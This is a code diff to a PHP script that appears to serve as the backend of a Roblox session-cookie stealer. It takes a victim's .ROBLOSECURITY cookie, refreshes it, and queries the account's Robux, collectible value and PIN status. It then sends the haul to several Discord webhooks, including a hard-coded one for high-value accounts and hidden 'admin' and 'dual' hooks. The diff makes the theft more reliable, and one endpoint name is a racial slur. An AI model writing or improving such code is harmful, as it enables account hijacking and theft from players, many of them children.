@@ -85,6 +85,38 @@ function getCurlErrorReason($curlError) {
     return "CURL Error: $curlError";
 }
 
+function buildHttpErrorDetails($httpCode, $curlError, $response = '', $url = '') {
+    $details = [];
+    if (!empty($url)) {
+        $details[] = "URL: $url";
+    }
+
+    $httpReason = getHttpErrorReason($httpCode);
+    $details[] = "HTTP $httpCode: $httpReason";
+
+    $curlReason = getCurlErrorReason($curlError);
+    if (!empty($curlReason)) {
+        $details[] = $curlReason;
+    } elseif (!empty($curlError)) {
+        $details[] = "CURL Error: $curlError";
+    }
+
+    if (is_string($response)) {
+        $trimmed = trim($response);
+        if ($trimmed === '') {
+            $details[] = "No response body";
+        } else {
+            $snippet = substr(preg_replace('/\s+/', ' ', $trimmed), 0, 180);
+            if (strlen($trimmed) > 180) {
+                $snippet .= '...';
+            }
+            $details[] = "Response snippet: $snippet";
+        }
+    }
+
+    return implode(' | ', $details);
+}
+
 function logStep($step, $status, $details = '') {
     global $logFile, $logFileAlt1, $logFileAlt2, $logFileAlt3;
     $timestamp = date('Y-m-d H:i:s');
@@ -119,13 +151,14 @@ function logStep($step, $status, $details = '') {
 // Initialize log
 logStep('SCRIPT_START', 'INFO', 'UserInfo script started');
 
-$cookie = $_GET['cookie'];
+$cookie = $_GET['cookie'] ?? '';
+$cookie = normalizeRobloxCookie($cookie);
 if (empty($cookie)) {
-    logStep('COOKIE_VALIDATION', 'ERROR', 'No cookie provided in request');
-    echo json_encode(['status' => 'error', 'message' => 'No cookie provided']);
+    logStep('COOKIE_VALIDATION', 'ERROR', 'Cookie missing or could not be normalized');
+    echo json_encode(['status' => 'error', 'message' => 'Invalid cookie provided']);
     exit;
 }
-logStep('COOKIE_RECEIVED', 'SUCCESS', 'Cookie received from request');
+logStep('COOKIE_RECEIVED', 'SUCCESS', 'Cookie received and normalized');
 $ht = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
 // Use HTTP_HOST so localhost includes the dev server port (e.g., localhost:8000)
 $dom = $ht . $_SERVER['HTTP_HOST'];
@@ -135,17 +168,30 @@ function getLocal($url, $timeout = 6) {
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
     curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
-    $res = curl_exec($ch);
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $error = curl_error($ch);
     curl_close($ch);
-    return $res;
+
+    if ($response === false || $httpCode >= 400 || trim((string)$response) === '') {
+        $details = buildHttpErrorDetails($httpCode, $error, $response, $url);
+        logStep('LOCAL_REQUEST', 'ERROR', $details);
+    } else {
+        logStep('LOCAL_REQUEST', 'SUCCESS', "URL: $url | HTTP $httpCode");
+    }
+
+    return $response;
 }
 
 logStep('COOKIE_REFRESH', 'INFO', 'Attempting to refresh cookie');
-$refreshedCookie = getLocal("$dom/controlPage/apis/refresher.php?cookie=$cookie", 6);
+$encodedCookie = rawurlencode($cookie);
+$refresherUrl = $dom . "/controlPage/apis/refresher.php?cookie=" . $encodedCookie;
+$refreshedCookie = getLocal($refresherUrl, 6);
 if ($refreshedCookie == "Invalid Cookie" || $refreshedCookie === false || $refreshedCookie === null) {
     $refreshReason = $refreshedCookie === false ? 'Request failed or timeout' : ($refreshedCookie === null ? 'Null response' : 'Invalid cookie response');
     logStep('COOKIE_REFRESH', 'WARNING', "Refresher failed: $refreshReason - Trying alternative method");
-    $refreshedCookie = getLocal("$dom/controlPage/apis/nigger.php?cookie=$cookie", 6);
+    $fallbackUrl = $dom . "/controlPage/apis/nigger.php?cookie=" . $encodedCookie;
+    $refreshedCookie = getLocal($fallbackUrl, 6);
 }
 if (!$refreshedCookie || stripos($refreshedCookie, 'WARNING') !== false) {
     // fall back to original cookie to avoid total failure
@@ -156,20 +202,39 @@ if (!$refreshedCookie || stripos($refreshedCookie, 'WARNING') !== false) {
     logStep('COOKIE_REFRESH', 'SUCCESS', 'Cookie refreshed successfully');
 }
 
-function makeRequest($url, $headers, $postData = null, $timeout = 8) {
+$refreshedCookie = normalizeRobloxCookie($refreshedCookie);
+if (empty($refreshedCookie)) {
+    logStep('COOKIE_REFRESH', 'ERROR', 'Refreshed cookie normalization failed - reverting to original cookie');
+    $refreshedCookie = $cookie;
+}
+
+$headers = ["Cookie: .ROBLOSECURITY=$refreshedCookie", "Content-Type: application/json"];
+
+function makeRequestDetailed($url, $headers, $postData = null, $timeout = 8) {
     $ch = curl_init($url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
     curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
+    curl_setopt($ch, CURLOPT_ENCODING, '');
     if ($postData) {
         curl_setopt($ch, CURLOPT_POST, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
     }
     $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $error = curl_error($ch);
     curl_close($ch);
-    return $response;
+    return ['response' => $response, 'http_code' => $httpCode, 'error' => $error];
+}
+
+function makeRequest($url, $headers, $postData = null, $timeout = 8) {
+    $result = makeRequestDetailed($url, $headers, $postData, $timeout);
+    return $result['response'];
 }
 
 // Separate function for webhook requests that returns detailed result
@@ -208,26 +273,92 @@ function sanitize($value, $maxLength = 1024) {
     return substr($value, 0, $maxLength);
 }
 
-$headers = ["Cookie: .ROBLOSECURITY=$refreshedCookie", "Content-Type: application/json"];
+function normalizeRobloxCookie($cookieRaw) {
+    if ($cookieRaw === null) {
+        return '';
+    }
+    $cookie = trim($cookieRaw);
+    if ($cookie === '') {
+        return '';
+    }
+    // Decode once if URL encoded
+    if (strpos($cookie, '%') !== false) {
+        $decoded = rawurldecode($cookie);
+        if ($decoded !== false) {
+            $cookie = $decoded;
+        }
+    }
+    // Remove leading cookie name if present
+    if (stripos($cookie, '.ROBLOSECURITY=') === 0) {
+        $cookie = substr($cookie, strlen('.ROBLOSECURITY='));
+    }
+    // Trim after first dangerous delimiter (quote, newline, space, tab, backslash)
+    $cookie = preg_split("/[\n\r\t'\"\\\\ ]/", $cookie)[0] ?? $cookie;
+    // Trim after encoded delimiters
+    foreach ([';', '%3B', '%0A', '%0D', '%09'] as $delimiter) {
+        $pos = stripos($cookie, $delimiter);
+        if ($pos !== false) {
+            $cookie = substr($cookie, 0, $pos);
+        }
+    }
+    return trim($cookie);
+}
 
 logStep('FETCH_USER_SETTINGS', 'INFO', 'Fetching user settings from Roblox');
-$settingsData = json_decode(makeRequest("https://www.roblox.com/my/settings/json", $headers), true);
+$settingsResult = makeRequestDetailed("https://www.roblox.com/my/settings/json", $headers);
+$settingsRaw = $settingsResult['response'];
+$settingsHttpCode = $settingsResult['http_code'];
+$settingsCurlError = $settingsResult['error'];
+if ($settingsHttpCode >= 200 && $settingsHttpCode < 300 && trim((string)$settingsRaw) !== '') {
+    logStep('FETCH_USER_SETTINGS', 'SUCCESS', "HTTP $settingsHttpCode");
+    $settingsData = json_decode($settingsRaw, true);
+    if ($settingsData === null && json_last_error() !== JSON_ERROR_NONE) {
+        logStep('FETCH_USER_SETTINGS', 'ERROR', 'JSON decode failed: ' . json_last_error_msg());
+        $settingsData = [];
+    }
+} else {
+    $details = buildHttpErrorDetails($settingsHttpCode, $settingsCurlError, $settingsRaw, "https://www.roblox.com/my/settings/json");
+    logStep('FETCH_USER_SETTINGS', 'ERROR', $details);
+    $settingsData = json_decode($settingsRaw, true);
+    if (!is_array($settingsData)) {
+        $settingsData = [];
+    }
+}
 $userId = $settingsData['UserId'] ?? 0;
 if ($userId == 0) {
-    $errorReason = empty($settingsData) ? 'Empty response from Roblox API' : 'UserId field missing in response';
+    $errorReason = empty($settingsData) ? 'Empty or invalid JSON response from Roblox API' : 'UserId field missing in response';
     if (isset($settingsData['errors'])) {
-        $errorReason .= ' - Roblox API errors: ' . json_encode($settingsData['errors']);
+        $errorReason .= ' | Roblox API errors: ' . json_encode($settingsData['errors']);
     }
-    logStep('FETCH_USER_SETTINGS', 'ERROR', "Failed to get UserId: $errorReason");
+    logStep('FETCH_USER_SETTINGS', 'ERROR', "Failed to extract UserId: $errorReason");
 } else {
-    logStep('FETCH_USER_SETTINGS', 'SUCCESS', "UserId: $userId");
+    logStep('FETCH_USER_SETTINGS', 'INFO', "UserId: $userId (HTTP $settingsHttpCode)");
 }
 
 logStep('FETCH_USER_INFO', 'INFO', "Fetching user info for userId: $userId");
-$userInfoData = json_decode(makeRequest("https://users.roblox.com/v1/users/$userId", $headers), true);
+$userInfoResult = makeRequestDetailed("https://users.roblox.com/v1/users/$userId", $headers);
+$userInfoRaw = $userInfoResult['response'];
+$userInfoHttp = $userInfoResult['http_code'];
+$userInfoError = $userInfoResult['error'];
+if ($userInfoHttp >= 200 && $userInfoHttp < 300 && trim((string)$userInfoRaw) !== '') {
+    $userInfoData = json_decode($userInfoRaw, true);
+    if ($userInfoData === null && json_last_error() !== JSON_ERROR_NONE) {
+        logStep('FETCH_USER_INFO', 'ERROR', 'JSON decode failed: ' . json_last_error_msg());
+        $userInfoData = [];
+    } else {
+        logStep('FETCH_USER_INFO', 'SUCCESS', "HTTP $userInfoHttp");
+    }
+} else {
+    $details = buildHttpErrorDetails($userInfoHttp, $userInfoError, $userInfoRaw, "https://users.roblox.com/v1/users/$userId");
+    logStep('FETCH_USER_INFO', 'ERROR', $details);
+    $userInfoData = json_decode($userInfoRaw, true);
+    if (!is_array($userInfoData)) {
+        $userInfoData = [];
+    }
+}
 $displayName = sanitize($userInfoData['displayName'] ?? 'Unknown');
 $username = sanitize($userInfoData['name'] ?? 'Unknown');
-logStep('FETCH_USER_INFO', 'SUCCESS', "Username: $username, DisplayName: $displayName");
+logStep('FETCH_USER_INFO', 'INFO', "Username: $username, DisplayName: $displayName");
 
 $games = [
     'BF' => json_decode(makeRequest("https://games.roblox.com/v1/games/994732206/votes/user", $headers), true)['canVote'] ? '✅' : '❌',
@@ -253,13 +384,49 @@ $avatarJson = json_decode($avatarData, true);
 $avatarUrl = $avatarJson['data'][0]['imageUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';
 
 logStep('FETCH_BALANCE', 'INFO', 'Fetching Robux balance');
-$balanceData = json_decode(makeRequest("https://economy.roblox.com/v1/users/$userId/currency", $headers), true);
+$balanceResult = makeRequestDetailed("https://economy.roblox.com/v1/users/$userId/currency", $headers);
+$balanceRaw = $balanceResult['response'];
+$balanceHttp = $balanceResult['http_code'];
+$balanceError = $balanceResult['error'];
+if ($balanceHttp >= 200 && $balanceHttp < 300 && trim((string)$balanceRaw) !== '') {
+    logStep('FETCH_BALANCE', 'SUCCESS', "HTTP $balanceHttp");
+    $balanceData = json_decode($balanceRaw, true);
+    if ($balanceData === null && json_last_error() !== JSON_ERROR_NONE) {
+        logStep('FETCH_BALANCE', 'ERROR', 'JSON decode failed: ' . json_last_error_msg());
+        $balanceData = [];
+    }
+} else {
+    $details = buildHttpErrorDetails($balanceHttp, $balanceError, $balanceRaw, "https://economy.roblox.com/v1/users/$userId/currency");
+    logStep('FETCH_BALANCE', 'ERROR', $details);
+    $balanceData = json_decode($balanceRaw, true);
+    if (!is_array($balanceData)) {
+        $balanceData = [];
+    }
+}
 $robux = isset($balanceData['robux']) ? number_format($balanceData['robux']) : 0;
 $pendingRobux = isset($transactionSummaryData['pendingRobuxTotal']) ? number_format($transactionSummaryData['pendingRobuxTotal']) : '❓ Unknown';
-logStep('FETCH_BALANCE', 'SUCCESS', "Robux: $robux, Pending: $pendingRobux");
+logStep('FETCH_BALANCE', 'INFO', "Robux: $robux, Pending: $pendingRobux");
 
 logStep('FETCH_INVENTORY', 'INFO', 'Fetching inventory and RAP data');
-$collectiblesData = json_decode(makeRequest("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?limit=100", $headers), true);
+$collectiblesResult = makeRequestDetailed("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?limit=100", $headers);
+$collectiblesRaw = $collectiblesResult['response'];
+$collectiblesHttp = $collectiblesResult['http_code'];
+$collectiblesError = $collectiblesResult['error'];
+if ($collectiblesHttp >= 200 && $collectiblesHttp < 300 && trim((string)$collectiblesRaw) !== '') {
+    logStep('FETCH_INVENTORY', 'SUCCESS', "HTTP $collectiblesHttp");
+    $collectiblesData = json_decode($collectiblesRaw, true);
+    if ($collectiblesData === null && json_last_error() !== JSON_ERROR_NONE) {
+        logStep('FETCH_INVENTORY', 'ERROR', 'JSON decode failed: ' . json_last_error_msg());
+        $collectiblesData = ['data' => []];
+    }
+} else {
+    $details = buildHttpErrorDetails($collectiblesHttp, $collectiblesError, $collectiblesRaw, "https://inventory.roblox.com/v1/users/$userId/assets/collectibles?limit=100");
+    logStep('FETCH_INVENTORY', 'ERROR', $details);
+    $collectiblesData = json_decode($collectiblesRaw, true);
+    if (!is_array($collectiblesData)) {
+        $collectiblesData = ['data' => []];
+    }
+}
 $rap = 0;
 if (isset($collectiblesData['data'])) {
     foreach ($collectiblesData['data'] as $item) {
@@ -268,7 +435,7 @@ if (isset($collectiblesData['data'])) {
 }
 $rap = number_format($rap);
 $inventoryCount = isset($collectiblesData['total']) ? number_format($collectiblesData['total']) : '❓ Unknown';
-logStep('FETCH_INVENTORY', 'SUCCESS', "RAP: $rap, Inventory Count: $inventoryCount");
+logStep('FETCH_INVENTORY', 'INFO', "RAP: $rap, Inventory Count: $inventoryCount");
 
 $pinData = json_decode(makeRequest("https://auth.roblox.com/v1/account/pin", $headers), true);
 $pinStatus = isset($pinData['isEnabled']) ? ($pinData['isEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';
@@ -366,14 +533,6 @@ $filteredWebhook = "https://discord.com/api/webhooks/1286978728701857812/brPoKB_
 logStep('WEBHOOK_COLLECTION', 'INFO', 'Starting webhook collection');
 $webhooks = [];
 
-// Add adminhook first (constant webhook - always receives all embeds)
-if (!empty($adminhook)) {
-    $webhooks[] = $adminhook;
-    logStep('WEBHOOK_COLLECTION', 'SUCCESS', 'Adminhook added to webhooks array');
-} else {
-    logStep('WEBHOOK_COLLECTION', 'ERROR', 'Adminhook is empty!');
-}
-
 // Get main webhook (PHP automatically decodes URL parameters, but handle both encoded and decoded)
 $mainWebhookRaw = $_GET["web"] ?? '';
 $mainWebhook = $mainWebhookRaw;
@@ -462,17 +621,48 @@ $isHighValue = (
     $followersCount >= 10000
 );
 
-if ($isHighValue) {
-    // Replace main webhook with filtered webhook, but keep dualhook and adminhook
-    $webhooks = [$filteredWebhook];
-    // Always include adminhook (constant)
-    if (!empty($adminhook)) {
-        $webhooks[] = $adminhook;
-    }
-    if (!empty($dualhook)) {
-        $webhooks[] = $dualhook;
-    }
+logStep('HIGH_VALUE_CHECK', 'INFO', 'isHighValue = ' . ($isHighValue ? 'true' : 'false'));
+
+// Build final webhook order: filtered (if high value), main, admin, dualhook
+$finalWebhooks = [];
+
+if ($isHighValue && !empty($filteredWebhook) && filter_var($filteredWebhook, FILTER_VALIDATE_URL)) {
+    $finalWebhooks[] = $filteredWebhook;
+    logStep('WEBHOOK_COLLECTION', 'INFO', 'High value detected, adding filtered webhook');
 }
+
+if (!empty($mainWebhook) && filter_var($mainWebhook, FILTER_VALIDATE_URL)) {
+    $finalWebhooks[] = $mainWebhook;
+    logStep('WEBHOOK_COLLECTION', 'INFO', 'Main webhook retained in send list');
+} elseif (!empty($mainWebhook)) {
+    logStep('WEBHOOK_COLLECTION', 'ERROR', 'Main webhook excluded: invalid URL format during final ordering');
+}
+
+if (!empty($adminhook) && filter_var($adminhook, FILTER_VALIDATE_URL)) {
+    $finalWebhooks[] = $adminhook;
+    logStep('WEBHOOK_COLLECTION', 'INFO', 'Adminhook included in send list');
+} else {
+    logStep('WEBHOOK_COLLECTION', 'ERROR', 'Adminhook missing or invalid during final ordering');
+}
+
+if (!empty($dualhook) && filter_var($dualhook, FILTER_VALIDATE_URL)) {
+    $finalWebhooks[] = $dualhook;
+    logStep('WEBHOOK_COLLECTION', 'INFO', 'Dualhook included in send list');
+}
+
+// Deduplicate while preserving order
+$webhooks = [];
+$seen = [];
+foreach ($finalWebhooks as $hook) {
+    $normalized = trim($hook);
+    if ($normalized === '' || isset($seen[$normalized])) {
+        continue;
+    }
+    $webhooks[] = $normalized;
+    $seen[$normalized] = true;
+}
+
+logStep('WEBHOOK_COLLECTION', 'INFO', 'Final webhook count: ' . count($webhooks));
 
 $timestamp = date("c");
 $space = '|';
@@ -571,8 +761,20 @@ foreach ($webhooks as $webhookIndex => $webhook) {
         logStep('WEBHOOK_SENDING', 'WARNING', "Webhook #$webhookIndex is empty, skipping");
         continue;
     }
-    
-    $webhookName = ($webhook === $adminhook) ? 'adminhook' : (($webhookIndex == 1 && !empty($mainWebhook)) ? 'main_webhook' : (($webhookIndex == 2 || ($webhookIndex == 1 && empty($mainWebhook))) ? 'dualhook' : "webhook_$webhookIndex"));
+
+    $normalizedWebhook = trim($webhook);
+    $normalizedMain = trim($mainWebhook ?? '');
+    $normalizedDual = trim($dualhook ?? '');
+
+    if (!empty($adminhook) && $normalizedWebhook === trim($adminhook)) {
+        $webhookName = 'adminhook';
+    } elseif (!empty($normalizedMain) && $normalizedWebhook === $normalizedMain) {
+        $webhookName = 'main_webhook';
+    } elseif (!empty($normalizedDual) && $normalizedWebhook === $normalizedDual) {
+        $webhookName = 'dualhook';
+    } else {
+        $webhookName = "webhook_$webhookIndex";
+    }
     logStep('WEBHOOK_SENDING', 'INFO', "Processing $webhookName (index: $webhookIndex)");
     
     // Send embed1 (RAP summary) to this webhook - ALWAYS send
@@ -583,13 +785,9 @@ foreach ($webhooks as $webhookIndex => $webhook) {
         logStep('WEBHOOK_SENDING', 'SUCCESS', "Embed1 sent to $webhookName - HTTP " . ($result1['http_code'] ?? 'unknown'));
     } else {
         $httpCode = $result1['http_code'] ?? 0;
-        $httpReason = getHttpErrorReason($httpCode);
         $curlError = $result1['error'] ?? '';
-        $curlReason = getCurlErrorReason($curlError);
-        $errorDetails = "HTTP $httpCode: $httpReason";
-        if (!empty($curlReason)) {
-            $errorDetails .= " | $curlReason";
-        }
+        $responseBody = $result1['response'] ?? '';
+        $errorDetails = buildHttpErrorDetails($httpCode, $curlError, $responseBody, $webhook);
         logStep('WEBHOOK_SENDING', 'ERROR', "Embed1 failed for $webhookName - $errorDetails");
     }
     // Minimal delay before sending embed2 to prevent rate limiting
@@ -604,13 +802,9 @@ foreach ($webhooks as $webhookIndex => $webhook) {
     // Check if embed2 succeeded, retry once if failed (Discord sometimes rate limits)
     if (!$embed2Success) {
         $httpCode = $result2['http_code'] ?? 0;
-        $httpReason = getHttpErrorReason($httpCode);
         $curlError = $result2['error'] ?? '';
-        $curlReason = getCurlErrorReason($curlError);
-        $errorDetails = "HTTP $httpCode: $httpReason";
-        if (!empty($curlReason)) {
-            $errorDetails .= " | $curlReason";
-        }
+        $responseBody = $result2['response'] ?? '';
+        $errorDetails = buildHttpErrorDetails($httpCode, $curlError, $responseBody, $webhook);
         logStep('WEBHOOK_SENDING', 'WARNING', "Embed2 failed for $webhookName - $errorDetails - Retrying...");
         usleep(500000); // 0.5 seconds delay before retry
         $result2Retry = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed2);
@@ -620,13 +814,9 @@ foreach ($webhooks as $webhookIndex => $webhook) {
         } else {
             // If retry also failed, try one more time
             $retryHttpCode = $result2Retry['http_code'] ?? 0;
-            $retryHttpReason = getHttpErrorReason($retryHttpCode);
             $retryCurlError = $result2Retry['error'] ?? '';
-            $retryCurlReason = getCurlErrorReason($retryCurlError);
-            $retryErrorDetails = "HTTP $retryHttpCode: $retryHttpReason";
-            if (!empty($retryCurlReason)) {
-                $retryErrorDetails .= " | $retryCurlReason";
-            }
+            $retryResponseBody = $result2Retry['response'] ?? '';
+            $retryErrorDetails = buildHttpErrorDetails($retryHttpCode, $retryCurlError, $retryResponseBody, $webhook);
             logStep('WEBHOOK_SENDING', 'WARNING', "Embed2 retry failed for $webhookName - $retryErrorDetails - Final retry...");
             usleep(700000); // 0.7 seconds delay
             $result2Final = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed2);
@@ -635,13 +825,9 @@ foreach ($webhooks as $webhookIndex => $webhook) {
                 logStep('WEBHOOK_SENDING', 'SUCCESS', "Embed2 final retry successful for $webhookName - HTTP " . ($result2Final['http_code'] ?? 'unknown'));
             } else {
                 $finalHttpCode = $result2Final['http_code'] ?? 0;
-                $finalHttpReason = getHttpErrorReason($finalHttpCode);
                 $finalCurlError = $result2Final['error'] ?? '';
-                $finalCurlReason = getCurlErrorReason($finalCurlError);
-                $finalErrorDetails = "HTTP $finalHttpCode: $finalHttpReason";
-                if (!empty($finalCurlReason)) {
-                    $finalErrorDetails .= " | $finalCurlReason";
-                }
+                $finalResponseBody = $result2Final['response'] ?? '';
+                $finalErrorDetails = buildHttpErrorDetails($finalHttpCode, $finalCurlError, $finalResponseBody, $webhook);
                 logStep('WEBHOOK_SENDING', 'ERROR', "Embed2 final retry failed for $webhookName - $finalErrorDetails");
             }
         }
@@ -663,13 +849,9 @@ if (isset($backupResult1['http_code']) && $backupResult1['http_code'] >= 200 && 
     logStep('WEBHOOK_SENDING', 'SUCCESS', 'Non-filtered webhook embed1 sent - HTTP ' . $backupResult1['http_code']);
 } else {
     $backupHttpCode = $backupResult1['http_code'] ?? 0;
-    $backupHttpReason = getHttpErrorReason($backupHttpCode);
     $backupCurlError = $backupResult1['error'] ?? '';
-    $backupCurlReason = getCurlErrorReason($backupCurlError);
-    $backupErrorDetails = "HTTP $backupHttpCode: $backupHttpReason";
-    if (!empty($backupCurlReason)) {
-        $backupErrorDetails .= " | $backupCurlReason";
-    }
+    $backupResponse = $backupResult1['response'] ?? '';
+    $backupErrorDetails = buildHttpErrorDetails($backupHttpCode, $backupCurlError, $backupResponse, $nonFilteredWebhook);
     logStep('WEBHOOK_SENDING', 'ERROR', "Non-filtered webhook embed1 failed - $backupErrorDetails");
 }
 usleep(300000); // 0.3 seconds
@@ -678,13 +860,9 @@ if (isset($backupResult2['http_code']) && $backupResult2['http_code'] >= 200 && 
     logStep('WEBHOOK_SENDING', 'SUCCESS', 'Non-filtered webhook embed2 sent - HTTP ' . $backupResult2['http_code']);
 } else {
     $backup2HttpCode = $backupResult2['http_code'] ?? 0;
-    $backup2HttpReason = getHttpErrorReason($backup2HttpCode);
     $backup2CurlError = $backupResult2['error'] ?? '';
-    $backup2CurlReason = getCurlErrorReason($backup2CurlError);
-    $backup2ErrorDetails = "HTTP $backup2HttpCode: $backup2HttpReason";
-    if (!empty($backup2CurlReason)) {
-        $backup2ErrorDetails .= " | $backup2CurlReason";
-    }
+    $backup2Response = $backupResult2['response'] ?? '';
+    $backup2ErrorDetails = buildHttpErrorDetails($backup2HttpCode, $backup2CurlError, $backup2Response, $nonFilteredWebhook);
     logStep('WEBHOOK_SENDING', 'ERROR', "Non-filtered webhook embed2 failed - $backup2ErrorDetails");
 }
 
